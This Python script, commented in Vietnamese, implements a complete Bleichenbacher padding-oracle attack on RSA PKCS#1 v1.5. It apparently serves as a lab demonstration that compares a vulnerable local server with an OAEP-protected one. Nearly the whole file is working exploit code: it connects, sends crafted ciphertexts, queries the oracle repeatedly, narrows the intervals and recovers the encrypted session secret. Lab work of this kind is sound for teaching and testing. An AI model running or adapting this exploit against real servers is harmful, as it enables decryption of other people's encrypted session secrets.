#!/usr/bin/env python3
"""
session_attack.py
Attack hoạt động với CẢ HAI server
"""

import socket
import binascii
import time
import random
import sys

class UniversalSessionAttack:
    def __init__(self):
        self.socket = None
        self.n = None
        self.e = None
        self.session_id = None
        self.encrypted_secret = None
        self.k = None
        self.B = None
        self.server_type = None  # 'oracle' hoặc 'secure'
        
    def choose_server(self):
        """Chọn server để kết nối"""
        print("\n" + "="*50)
        print("SELECT SERVER TO ATTACK")
        print("="*50)
        print("1 - Oracle Server (Port 9999) - VULNERABLE")
        print("    • Uses PKCS#1 v1.5")
        print("    • Vulnerable to Bleichenbacher")
        print("2 - Secure Server (Port 9990) - PROTECTED") 
        print("    • Uses RSA-OAEP")
        print("    • Constant-time + Error hiding")

        choice = input("\nSelect server (1/2/3): ").strip()
        
        if choice == "1":
            self.host = '127.0.0.1'
            self.port = 9999
            self.server_type = 'oracle'
            print(f"[+] Targeting ORACLE server {self.host}:{self.port}")
        elif choice == "2":
            self.host = '127.0.0.1' 
            self.port = 9990
            self.server_type = 'secure'
            print(f"[+] Targeting SECURE server {self.host}:{self.port}")
        else:
            print("[-] Invalid choice")
            return False
            
        return True

    def connect_universal(self):
        """Kết nối đến server (hoạt động với cả hai loại)"""
        print(f"\n[*] Connecting to {self.server_type.upper()} server {self.host}:{self.port}")
        
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(30)
            self.socket.connect((self.host, self.port))
            
            # Nhận session info (cả hai server đều gửi format này)
            session_line = self.socket.recv(256).decode().strip()
            modulus_line = self.socket.recv(256).decode().strip()
            exponent_line = self.socket.recv(256).decode().strip()
            
            self.session_id = session_line.split(":")[1]
            self.n = int(modulus_line.split(":")[1], 16)
            self.e = int(exponent_line.split(":")[1], 16)
            self.k = (self.n.bit_length() + 7) // 8
            self.B = 2 ** (8 * (self.k - 2))
            
            print(f"[+] Connected to Session {self.session_id}")
            print(f"[+] RSA {self.n.bit_length()} bits, k={self.k} bytes")
            print(f"[+] Server type: {self.server_type.upper()}")
            
            # Gửi client hello (luôn dùng PKCS#1 v1.5 - để test cả hai server)
            client_hello_padded = self.pkcs1_pad(b"ClientHello")
            client_hello_encrypted = pow(client_hello_padded, self.e, self.n)
            
            hello_msg = f"CLIENT_HELLO:{client_hello_encrypted:x}\n"
            self.socket.sendall(hello_msg.encode())
            print(f"[+] Sent ClientHello (PKCS#1 v1.5)")
            
            # Nhận response và xử lý theo server type
            response = self.socket.recv(1024).decode().strip()
            print(f"[DEBUG] Server response: {response}")
            
            if response == "ERROR":
                if self.server_type == 'secure':
                    print("[X] SECURE SERVER: Rejected PKCS#1 v1.5 (Expected)")
                    print("[X] Attack prevented by RSA-OAEP protection")
                    return 'blocked'
                else:
                    print("[X] ORACLE SERVER: Unexpected error")
                    return 'error'
                    
            elif response.startswith("SESSION_SECRET:"):
                self.encrypted_secret = int(response.split(":")[1], 16)
                print(f"[+] Received encrypted session secret")
                
                if self.server_type == 'oracle':
                    print("[V] ORACLE SERVER: Accepted PKCS#1 v1.5 - VULNERABLE")
                    return 'success'
                else:
                    print("[!]  SECURE SERVER: Accepted PKCS#1 v1.5 - CHECK CONFIG")
                    return 'success'
                    
            else:
                print(f"[-] Unknown response: {response}")
                return 'error'
                
        except socket.timeout:
            print("[-] Connection timeout")
            return 'timeout'
        except Exception as e:
            print(f"[-] Connection error: {e}")
            return 'error'

    def pkcs1_pad(self, message):
        """PKCS#1 v1.5 padding"""
        if len(message) > self.k - 11:
            raise ValueError(f"Message too long for PKCS#1 padding: {len(message)} > {self.k - 11}")
            
        padding_len = self.k - 3 - len(message)
        padding = bytes([random.randint(1, 255) for _ in range(padding_len)])
        
        padded = b'\x00\x02' + padding + b'\x00' + message
        return int.from_bytes(padded, byteorder='big')

    # ========== CÁC HÀM BLEICHENBACHER GIỮ NGUYÊN ==========
    
    def query_oracle(self, ciphertext_int):
        """Gửi query đến oracle"""
        try:
            c_bytes = ciphertext_int.to_bytes(self.k, byteorder='big')
            c_hex = binascii.hexlify(c_bytes).decode()
            
            self.socket.sendall((c_hex + "\n").encode())
            response = self.socket.recv(32).decode().strip()
            
            return response == "1"
        except Exception as e:
            return False

    def ceil(self, a, b):
        return (a + b - 1) // b

    def floor(self, a, b):
        return a // b

    def step1_find_s0(self, c0):
        print(f"[*] Step 1: Finding initial s0")
        s = self.ceil(self.n, 3 * self.B)
        count = 0
        
        while True:
            c_prime = (c0 * pow(s, self.e, self.n)) % self.n
            if self.query_oracle(c_prime):
                print(f"[+] Found s0 = {s} after {count} queries")
                return s
            s += 1
            count += 1
            if count % 10000 == 0:
                print(f"    ... tried {count} values")

    def step2_narrow(self, c0, s, M):
        B2 = 2 * self.B
        B3 = 3 * self.B
        new_M = set()
        for (a, b) in M:
            r_min = self.ceil(a * s - B3 + 1, self.n)
            r_max = self.floor(b * s - B2, self.n)
            for r in range(r_min, r_max + 1):
                low = max(a, self.ceil(B2 + r * self.n, s))
                high = min(b, self.floor(B3 - 1 + r * self.n, s))
                if low <= high:
                    new_M.add((low, high))
        return new_M

    def step3_find_next_s(self, c0, M, s_prev):
        if len(M) > 1:
            s = s_prev + 1
            while True:
                c_prime = (c0 * pow(s, self.e, self.n)) % self.n
                if self.query_oracle(c_prime):
                    return s
                s += 1
        else:
            a, b = next(iter(M))
            r = self.ceil(2 * (b * s_prev - 2 * self.B), self.n)
            while True:
                s_low = self.ceil(2 * self.B + r * self.n, b)
                s_high = self.floor(3 * self.B + r * self.n, a)
                for s in range(s_low, s_high + 1):
                    c_prime = (c0 * pow(s, self.e, self.n)) % self.n
                    if self.query_oracle(c_prime):
                        return s
                r += 1

    def extract_plaintext_bytes(self, m_int):
        try:
            m_bytes = m_int.to_bytes(self.k, byteorder='big')
            if m_bytes[0:2] == b'\x00\x02':
                pos = m_bytes.find(b'\x00', 2)
                if pos != -1:
                    return m_bytes[pos + 1:]
            return None
        except:
            return None

    def bleichenbacher_attack_real(self):
        if not self.encrypted_secret:
            print("[-] No encrypted secret to attack!")
            return None
        
        print(f"\n[*] Starting Bleichenbacher attack on {self.server_type.upper()} server...")
        print(f"    Target ciphertext: {self.encrypted_secret:x}")
        
        if self.server_type == 'secure':
            print("⚠️  WARNING: Attacking secure server - likely to FAIL!")
        
        c0 = self.encrypted_secret
        B2 = 2 * self.B
        B3 = 3 * self.B
        M = {(B2, B3 - 1)}
        
        print(f"[*] Initial interval: [{B2}, {B3-1}]")
        
        # Bước 1: Tìm s0
        s = self.step1_find_s0(c0)
        
        # Bước 2: Thu hẹp với s0
        M = self.step2_narrow(c0, s, M)
        print(f"[*] After s0: {len(M)} intervals")
        
        # Bước 3: Lặp
        iteration = 1
        max_iterations = 5000
        
        while iteration <= max_iterations:
            if iteration % 100 == 0:
                print(f"  [Iteration {iteration}] Intervals: {len(M)}")
            
            s_prev = s
            s = self.step3_find_next_s(c0, M, s_prev)
            M_new = self.step2_narrow(c0, s, M)
            
            if len(M_new) == 1:
                a, b = next(iter(M_new))
                if a == b:
                    print(f"\n[+] Single point found: {a}")
                    recovered = self.extract_plaintext_bytes(a)
                    if recovered:
                        print(f"[+] Extracted: {recovered}")
                        return recovered
            
            M = M_new
            iteration += 1
            
            if len(M) == 0:
                print("[-] No intervals left!")
                break
        
        print("[-] Attack failed - max iterations reached")
        return None

    def close(self):
        if self.socket:
            self.socket.close()
            print("[+] Connection closed")

def main():
    print("UNIVERSAL SESSION ATTACK - WORKS WITH BOTH SERVERS")
    print("Oracle (9999) vs Secure (9990)")
    
    attack = UniversalSessionAttack()
    
    try:
        # Bước 1: Chọn server
        if not attack.choose_server():
            return
        
        # Bước 2: Kết nối
        result = attack.connect_universal()
        
        if result == 'blocked':
            print(f"\n[V] SECURE SERVER: Attack prevented by protections!")
        elif result == 'success':
            # Bước 3: Thực hiện attack
            start_time = time.time()
            secret = attack.bleichenbacher_attack_real()
            end_time = time.time()
            
            if secret:
                print(f"\n[V] SUCCESS! Session secret: {secret.hex()}")
                print(f"   Time: {end_time - start_time:.2f} seconds")
                
                if attack.server_type == 'secure':
                    print("[X] UNEXPECTED: Secure server was vulnerable!")
                else:
                    print("[X] EXPECTED: Oracle server was vulnerable")
            else:
                print(f"\n[X] FAILED! Could not recover session secret")
                
                if attack.server_type == 'secure':
                    print("[V] EXPECTED: Secure server protections worked!")
                else:
                    print("[?] UNEXPECTED: Oracle server resisted attack")
                    
    except KeyboardInterrupt:
        print("\n[*] Interrupted by user")
    except Exception as e:
        print(f"[-] Error: {e}")
        import traceback
        traceback.print_exc()
    finally:
        attack.close()

if __name__ == "__main__":
    main()